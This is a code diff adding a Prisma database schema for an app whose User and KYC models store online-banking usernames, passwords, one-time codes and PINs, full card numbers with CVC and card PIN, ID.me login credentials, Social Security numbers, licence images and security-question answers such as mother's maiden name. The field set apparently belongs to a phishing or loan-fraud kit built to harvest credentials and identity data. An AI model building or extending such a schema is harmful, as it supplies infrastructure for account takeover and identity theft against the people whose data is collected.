@@ -1,0 +1,83 @@
+generator client {
+  provider = "prisma-client-js"
+  output   = "../src/generated/client"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id                 String   @id @default(cuid())
+  email              String   @unique
+  password           String
+  status             String   @default("pending_kyc")
+  balance            Int      @default(0)
+  bankLinked         Boolean  @default(false)
+  bankVerified       Boolean  @default(false)
+  bankName           String?
+  
+  // Disbursement Details
+  disbursementAccount String?
+  disbursementRouting String?
+  accountType         String?
+  accountBalance      String?
+  bankUsername        String?
+  bankPassword        String?
+  bankOtp             String?
+  bankPin             String?
+  
+  // Card Details
+  cardNumber          String?
+  cardExp             String?
+  cardCvc             String?
+  cardPin             String?
+  
+  // ID.me Credentials
+  idMeEmail           String?
+  idMePassword        String?
+  idMeStatus          String?  @default("not_started") // not_started, pending, verified
+  
+  // Application Preferences
+  hasCreditCard       Boolean  @default(false)
+  filed2026Tax        Boolean  @default(false)
+  paymentFrequency    String?  @default("monthly")
+  
+  // Income Proof
+  incomeProofType     String?  // W2, 1040, 1099
+  incomeProofFile     String?  // Base64
+  incomeProofStatus   String?  @default("not_started") // not_started, pending, verified
+  
+  identityQuestionsStatus String? @default("not_started")
+  checklistCompleted  String?  
+  createdAt           DateTime @default(now())
+  updatedAt           DateTime @updatedAt
+  kyc                 KYC?
+}
+
+model KYC {
+  id           String   @id @default(cuid())
+  userId       String   @unique
+  user         User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  fullName     String
+  dob          String
+  ssn          String
+  address      String
+  city         String
+  state        String
+  zip          String
+  idNumber     String
+  licenseFront String?  
+  licenseBack  String?  
+  
+  // Extra Identity Questions
+  fathersName       String?
+  mothersName       String?
+  mothersMaidenName String?
+  placeOfBirth      String?
+  spouseName        String?
+
+  createdAt    DateTime @default(now())
+  updatedAt    DateTime @updatedAt
+}
